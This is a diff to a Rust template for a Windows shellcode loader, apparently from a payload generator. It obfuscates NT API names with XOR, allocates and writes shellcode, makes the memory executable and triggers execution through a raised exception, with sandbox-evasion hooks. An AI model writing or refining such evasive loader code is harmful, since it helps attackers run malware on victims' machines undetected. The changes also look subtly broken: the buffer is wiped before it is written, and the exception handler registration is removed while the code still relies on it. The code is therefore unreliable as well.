@@ -5,34 +5,33 @@
 {{LITCRYPT_SETUP}}
 {{COMMON_MODULE}}
 
+use std::ffi::CString;
+use std::include_bytes;
+use std::ptr::null_mut;
+
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE, EXCEPTION_EXECUTE_HANDLER},
+        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE},
         libloaderapi::{GetModuleHandleA, GetProcAddress},
-        errhandlingapi::EXCEPTION_POINTERS,
     },
-    shared::ntdef::NT_SUCCESS,
+    shared::{
+        ntdef::{NT_SUCCESS, HANDLE},
+    },
     ctypes::c_void,
 };
 
-use std::include_bytes;
-
 {{IMPORTS}}
 
-mod memory;
-mod cfg;
-mod veh;
+{{SANDBOX_IMPORTS}}
 
-use memory::{set_memory_protection, MemoryProtection};
-use cfg::{encode_pointer, get_process_cookie};
-use veh::{add_veh_handler, trigger_exception};
+{{DECRYPTION_FUNCTION}}
 
-// Placeholders for obfuscated functions
+// Obfuscated API names
+const K: u8 = {{API_KEY}};
 const OBF_NT_ALLOCATE_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}};
 const OBF_NT_WRITE_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
 const OBF_NT_PROTECT_VIRTUAL_MEMORY: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
-
-const K: u8 = {{API_KEY}};
+const OBF_NT_RAISE_EXCEPTION: &[u8] = &{{OBF_NT_RAISE_EXCEPTION}};
 
 fn r(d: &[u8]) -> Vec<u8> {
     d.iter().map(|b| b ^ K).collect()
@@ -68,18 +67,23 @@ type FnNtProtectVirtualMemory = unsafe extern "system" fn(
     u32,
     *mut u32,
 ) -> i32;
+type FnNtRaiseException = unsafe extern "system" fn(
+    *mut c_void,
+    *mut c_void,
+    u32,
+) -> i32;
 
 fn allocate_rw_memory(size: usize) -> Option<*mut c_void> {
-    let current_process: isize = -1;
+    let current_process: HANDLE = -1isize as HANDLE;
 
     unsafe {
         let f_alloc: FnNtAllocateVirtualMemory = std::mem::transmute(g(OBF_NT_ALLOCATE_VIRTUAL_MEMORY));
 
-        let mut base: *mut c_void = std::ptr::null_mut();
+        let mut base: *mut c_void = null_mut();
         let mut alloc_size = size;
 
         let status = f_alloc(
-            current_process as _,
+            current_process,
             &mut base,
             0,
             &mut alloc_size,
@@ -96,14 +100,14 @@ fn allocate_rw_memory(size: usize) -> Option<*mut c_void> {
 }
 
 fn write_to_memory(destination: *mut c_void, source: &[u8]) -> bool {
-    let current_process: isize = -1;
+    let current_process: HANDLE = -1isize as HANDLE;
 
     unsafe {
         let f_write: FnNtWriteVirtualMemory = std::mem::transmute(g(OBF_NT_WRITE_VIRTUAL_MEMORY));
 
         let mut written: usize = 0;
         let status = f_write(
-            current_process as _,
+            current_process,
             destination,
             source.as_ptr() as *mut c_void,
             source.len(),
@@ -114,17 +118,8 @@ fn write_to_memory(destination: *mut c_void, source: &[u8]) -> bool {
     }
 }
 
-fn allocate_and_write_shellcode(buf: &[u8]) -> Option<*mut c_void> {
-    let base = allocate_rw_memory(buf.len())?;
-    if write_to_memory(base, buf) {
-        Some(base)
-    } else {
-        None
-    }
-}
-
 fn change_protection_to_rx(address: *mut c_void, size: usize) -> bool {
-    let current_process: isize = -1;
+    let current_process: HANDLE = -1isize as HANDLE;
 
     unsafe {
         let f_protect: FnNtProtectVirtualMemory = std::mem::transmute(g(OBF_NT_PROTECT_VIRTUAL_MEMORY));
@@ -133,7 +128,7 @@ fn change_protection_to_rx(address: *mut c_void, size: usize) -> bool {
         let mut region_size = size;
 
         let status = f_protect(
-            current_process as _,
+            current_process,
             &mut address,
             &mut region_size,
             PAGE_EXECUTE_READ,
@@ -144,13 +139,20 @@ fn change_protection_to_rx(address: *mut c_void, size: usize) -> bool {
     }
 }
 
-/// Handler for VEH-based execution
-extern "system" fn veh_handler(_exception_info: *mut EXCEPTION_POINTERS) -> i32 {
-    EXCEPTION_EXECUTE_HANDLER
+unsafe fn raise_exception() {
+    let f_raise: FnNtRaiseException = std::mem::transmute(g(OBF_NT_RAISE_EXCEPTION));
+    
+    // EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094
+    let status = f_raise(
+        0xC0000094 as *mut c_void,
+        null_mut(),
+        0,
+    );
+    // We don't check the status as this is expected to not return
 }
 
 fn execute_via_veh(mut buf: Vec<u8>) {
-    let base = allocate_and_write_shellcode(&buf);
+    let base = allocate_rw_memory(buf.len());
     if base.is_none() {
         return;
     }
@@ -158,13 +160,16 @@ fn execute_via_veh(mut buf: Vec<u8>) {
     let base = base.unwrap();
     common::wipe(&mut buf);
 
+    if !write_to_memory(base, &buf) {
+        return;
+    }
+
     if !change_protection_to_rx(base, buf.len()) {
         return;
     }
 
-    if add_veh_handler(veh_handler, true).is_some() {
-        trigger_exception();
-    }
+    // Trigger exception to execute our VEH handler
+    unsafe { raise_exception(); }
 }
 
 fn check_environment() -> bool {
